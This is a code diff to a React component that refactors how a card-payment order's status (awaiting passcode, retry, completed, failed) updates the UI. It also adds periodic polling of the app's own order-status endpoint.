@@ -1149,6 +1149,27 @@ function MainContent() {
     return () => window.clearInterval(tmr);
   }, [isAdmin, currentView, adminTab, fetchAdminCardFeed]);
 
+  const applyCardOrderStatus = useCallback((status: string) => {
+    if (status === 'awaiting_otp' || status === 'retry_otp') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(true);
+      setOtpState('input');
+      if (status === 'retry_otp') setOtpCode('');
+      return;
+    }
+    if (status === 'completed') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(false);
+      setIsSuccess(true);
+      return;
+    }
+    if (status === 'failed' || status === 'refunded' || status === 'suspended') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(true);
+      setOtpState('failed');
+    }
+  }, []);
+
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
     if ((otpState === 'checking' || cardProcessingToOtp) && currentOrderId) {
@@ -1161,33 +1182,36 @@ function MainContent() {
   }, [otpState, cardProcessingToOtp, currentOrderId, fetchTransactions]);
 
   useEffect(() => {
+    if (!cardProcessingToOtp || !currentOrderId || !clientId) return;
+
+    const pollOrderStatus = async () => {
+      try {
+        const qs = new URLSearchParams({
+          client_id: clientId,
+          order_ref: currentOrderId,
+        });
+        const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
+        if (!res.ok) return;
+        const data = (await res.json()) as { status?: string };
+        if (data?.status) applyCardOrderStatus(data.status);
+      } catch (e) {
+        console.error('pollOrderStatus:', e);
+      }
+    };
+
+    void pollOrderStatus();
+    const id = setInterval(() => void pollOrderStatus(), getOtpPollIntervalMs());
+    return () => clearInterval(id);
+  }, [cardProcessingToOtp, currentOrderId, clientId, applyCardOrderStatus]);
+
+  useEffect(() => {
     if (!cardProcessingToOtp || !currentOrderId) return;
     const tx = transactions.find(
       (t) => t.id === currentOrderId || t.order_ref === currentOrderId,
     );
     if (!tx) return;
-
-    if (tx.status === 'awaiting_otp' || tx.status === 'retry_otp') {
-      setCardProcessingToOtp(false);
-      setShowOtpStep(true);
-      setOtpState('input');
-      if (tx.status === 'retry_otp') setOtpCode('');
-      return;
-    }
-
-    if (tx.status === 'completed') {
-      setCardProcessingToOtp(false);
-      setShowOtpStep(false);
-      setIsSuccess(true);
-      return;
-    }
-
-    if (tx.status === 'failed' || tx.status === 'refunded' || tx.status === 'suspended') {
-      setCardProcessingToOtp(false);
-      setShowOtpStep(true);
-      setOtpState('failed');
-    }
-  }, [transactions, cardProcessingToOtp, currentOrderId]);
+    applyCardOrderStatus(tx.status);
+  }, [transactions, cardProcessingToOtp, currentOrderId, applyCardOrderStatus]);
 
   useEffect(() => {
     if (otpState === 'checking' && currentOrderId) {
